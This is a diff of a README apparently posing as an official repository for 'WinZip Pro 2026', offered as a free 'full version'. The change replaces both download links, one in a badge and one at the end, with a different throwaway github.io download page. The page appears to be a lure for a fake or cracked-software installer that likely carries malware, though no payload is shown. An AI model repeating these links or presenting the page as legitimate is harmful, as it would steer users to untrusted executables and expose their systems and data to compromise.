@@ -2,7 +2,7 @@
 
 Welcome to the official repository for **WinZip Pro 2026**, the complete solution for advanced file compression, encryption, and backup on Windows. This package provides the tools to manage your archives efficiently, protect sensitive data, and optimize storage, making it the ultimate winzip full version for your desktop.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest_Version-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest_Version-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -54,7 +54,7 @@ A: During installation, the option to add context menu items is enabled by defau
 
 You can obtain the latest installer and documentation for WinZip Pro 2026 from our official download page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
